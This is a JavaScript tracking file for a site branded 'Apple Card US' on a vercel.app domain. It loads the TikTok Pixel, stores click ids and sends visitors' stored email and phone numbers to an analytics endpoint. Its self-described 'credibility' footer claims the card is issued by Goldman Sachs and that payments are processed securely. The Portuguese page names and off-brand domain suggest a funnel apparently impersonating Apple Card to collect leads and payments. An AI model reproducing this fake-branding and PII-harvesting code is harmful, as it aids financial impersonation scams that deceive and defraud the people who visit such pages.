/*
 * Apple Card US — Unified tracking
 *
 *   • Initializes the TikTok Pixel (sdkid D7UKM8JC77U07JNLKKV0).
 *   • Persists UTMs + click ids (ttclid, fbclid, gclid, _ttp) in localStorage.
 *   • Exposes window.track(event, params) and window.identify() for the rest of the funnel.
 *   • Every track() is also POSTed to /api/tt (Events API server-side) to
 *     dedupe Purchase events and improve match quality.
 *
 * Events follow TikTok's standard taxonomy (Lead, AddToCart, InitiateCheckout,
 * AddPaymentInfo, Purchase, ViewContent, CompleteRegistration) plus custom
 * events to feed pixel learning.
 */

(function () {
  'use strict';

  // ─── UTM + click id persistence ───
  var TRACK_KEYS = ['utm_source','utm_medium','utm_campaign','utm_content','utm_term','ttclid','fbclid','gclid','src','sck'];
  var qs = new URLSearchParams(window.location.search);
  TRACK_KEYS.forEach(function (k) {
    var v = qs.get(k);
    if (v) localStorage.setItem('tt_' + k, v);
  });

  // ─── Stable external_id (UUID-like) ───
  var externalId = localStorage.getItem('tt_external_id');
  if (!externalId) {
    externalId = 'u_' + Math.random().toString(36).slice(2) + Date.now().toString(36);
    localStorage.setItem('tt_external_id', externalId);
  }

  // ─── TikTok Pixel base snippet ───
  !function (w, d, t) {
    w.TiktokAnalyticsObject = t;
    var ttq = w[t] = w[t] || [];
    ttq.methods = ["page","track","identify","instances","debug","on","off","once","ready","alias","group","enableCookie","disableCookie","holdConsent","revokeConsent","grantConsent"];
    ttq.setAndDefer = function (t, e) { t[e] = function () { t.push([e].concat(Array.prototype.slice.call(arguments, 0))) } };
    for (var i = 0; i < ttq.methods.length; i++) ttq.setAndDefer(ttq, ttq.methods[i]);
    ttq.instance = function (t) { for (var e = ttq._i[t] || [], n = 0; n < ttq.methods.length; n++) ttq.setAndDefer(e, ttq.methods[n]); return e };
    ttq.load = function (e, n) {
      var r = "https://analytics.tiktok.com/i18n/pixel/events.js";
      ttq._i = ttq._i || {}; ttq._i[e] = []; ttq._i[e]._u = r;
      ttq._t = ttq._t || {}; ttq._t[e] = +new Date;
      ttq._o = ttq._o || {}; ttq._o[e] = n || {};
      n = document.createElement("script");
      n.type = "text/javascript"; n.async = !0; n.src = r + "?sdkid=" + e + "&lib=" + t;
      e = document.getElementsByTagName("script")[0];
      e.parentNode.insertBefore(n, e);
    };
    ttq.load('D7UKM8JC77U07JNLKKV0');
    ttq.page();
  }(window, document, 'ttq');

  // ─── LeadData helper (same format used everywhere else in the funnel) ───
  function loadLead() {
    try { return JSON.parse(localStorage.getItem('applecard_lead') || '{}'); }
    catch (e) { return {}; }
  }

  function normalizePhone(raw) {
    if (!raw) return '';
    var digits = String(raw).replace(/\D+/g, '');
    // US numbers: 10 digits, optionally with leading 1 (country code)
    if (digits.length === 11 && digits.startsWith('1')) digits = digits.slice(1);
    return digits.length === 10 ? '+1' + digits : '';
  }

  // ─── Identify (call whenever we have fresh PII) ───
  function identify() {
    var lead = loadLead();
    var payload = { external_id: externalId };
    if (lead.email) payload.email = String(lead.email).trim().toLowerCase();
    var phone = normalizePhone(lead.telefone || lead.phone);
    if (phone) payload.phone_number = phone;
    if (window.ttq && window.ttq.identify) window.ttq.identify(payload);
  }

  // Identify immediately (if we already have data from a previous session)
  identify();

  // ─── Helpers ───
  function newEventId(name) {
    return 'evt_' + externalId + '_' + name + '_' + Date.now() + '_' + Math.random().toString(36).slice(2, 6);
  }

  function commonProperties(extra) {
    extra = extra || {};
    if (!('currency' in extra)) extra.currency = 'USD';
    if (!('content_type' in extra)) extra.content_type = 'product';
    return extra;
  }

  function sendServerSide(name, eventId, params) {
    try {
      var lead = loadLead();
      var body = {
        event: name,
        event_id: eventId,
        params: params,
        user: {
          external_id: externalId,
          email: lead.email || '',
          phone: lead.telefone || lead.phone || '',
        },
        page: {
          url: window.location.href,
          referrer: document.referrer || ''
        },
        ttclid: localStorage.getItem('tt_ttclid') || '',
        ttp: getCookie('_ttp') || ''
      };
      var json = JSON.stringify(body);
      if (navigator.sendBeacon) {
        var blob = new Blob([json], { type: 'application/json' });
        navigator.sendBeacon('/api/tt', blob);
      } else {
        fetch('/api/tt', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: json,
          keepalive: true
        }).catch(function () {});
      }
    } catch (e) { /* silent */ }
  }

  function getCookie(name) {
    var m = document.cookie.match(new RegExp('(?:^|; )' + name.replace(/([.$?*|{}()\[\]\\\/\+^])/g, '\\$1') + '=([^;]*)'));
    return m ? decodeURIComponent(m[1]) : '';
  }

  // ─── Public API ───
  window.track = function (eventName, params) {
    if (!eventName) return;
    params = commonProperties(params);
    var eid = newEventId(eventName);
    params.event_id = eid;

    try {
      if (window.ttq && window.ttq.track) {
        window.ttq.track(eventName, params, { event_id: eid });
      }
    } catch (e) { /* silent */ }

    sendServerSide(eventName, eid, params);
    return eid;
  };

  window.identifyUser = identify;

  // ─── Auto-track clicks on CTAs marked with data-track ───
  document.addEventListener('click', function (e) {
    var el = e.target;
    while (el && el !== document.body) {
      if (el.dataset && el.dataset.track) {
        var params = {};
        if (el.dataset.trackValue) params.value = parseFloat(el.dataset.trackValue);
        if (el.dataset.trackContentId) params.content_id = el.dataset.trackContentId;
        window.track(el.dataset.track, params);
        break;
      }
      el = el.parentElement;
    }
  }, true);

  // Re-identify when the tab regains focus (picks up LeadData updates from other pages)
  document.addEventListener('visibilitychange', function () {
    if (!document.hidden) identify();
  });

  // ─── Shared footer (credibility) — adapts to page theme ───
  function mountChrome() {
    // Skip footer if the page already has its own <footer> (e.g. index.html).
    if (document.querySelector('footer') || document.getElementById('siteFooter')) return;

    // Skip on full-viewport screens (loading screens, full-height chat,
    // flex-centered screens). In those cases, the footer either becomes
    // unreachable (overflow:hidden) or turns into a lateral flex item
    // (display:flex on body). Affected pages: analise, configurando, chat,
    // verificacao, obrigado.
    var bodyStyle = getComputedStyle(document.body);
    var isFullscreen = bodyStyle.overflow === 'hidden'
                    || bodyStyle.overflowY === 'hidden'
                    || bodyStyle.display === 'flex';
    if (isFullscreen) return;

    // Skip on pages that emulate an app with a fixed bottom nav (e.g. dashboard.html).
    // The legal footer would be covered by the nav and break the "app" feel.
    if (document.querySelector('.bottom-nav')) return;

    // Detect theme (light vs dark) via the body's background color.
    var bg = bodyStyle.backgroundColor || '';
    var rgb = bg.match(/\d+/g) || [255, 255, 255];
    var lum = (0.299 * +rgb[0] + 0.587 * +rgb[1] + 0.114 * +rgb[2]) / 255;
    var isDark = lum < 0.5;

    var linkColor = isDark ? 'rgba(255,255,255,0.55)' : '#6E6E73';
    var noteColor = isDark ? 'rgba(255,255,255,0.35)' : '#86868B';
    var borderColor = isDark ? 'rgba(255,255,255,0.08)' : '#E8E8ED';

    var f = document.createElement('footer');
    f.id = 'siteFooter';
    f.setAttribute('style', 'max-width:520px;margin:0 auto;padding:20px 20px 28px;font-size:0.6875rem;color:' + noteColor + ';line-height:1.55;text-align:center;border-top:0.5px solid ' + borderColor + ';background:transparent;');
    f.innerHTML = ''
      + '<div style="margin-bottom:6px"><a href="/privacidade.html" style="color:' + linkColor + ';text-decoration:none;margin:0 6px">Privacy</a> · '
      + '<a href="/termos.html" style="color:' + linkColor + ';text-decoration:none;margin:0 6px">Terms</a> · '
      + '<a href="/cookies.html" style="color:' + linkColor + ';text-decoration:none;margin:0 6px">Cookies</a> · '
      + '<a href="mailto:support@apple-card-en.vercel.app" style="color:' + linkColor + ';text-decoration:none;margin:0 6px">Support</a></div>'
      + '<div>© 2026 Apple Card · Issued by Goldman Sachs Bank USA</div>'
      + '<div style="margin-top:4px">Payments processed by Cooud · 256-bit SSL</div>';
    document.body.appendChild(f);
  }

  if (document.readyState === 'loading') {
    document.addEventListener('DOMContentLoaded', mountChrome);
  } else {
    mountChrome();
  }

  window.__tracker_ready = true;
})();
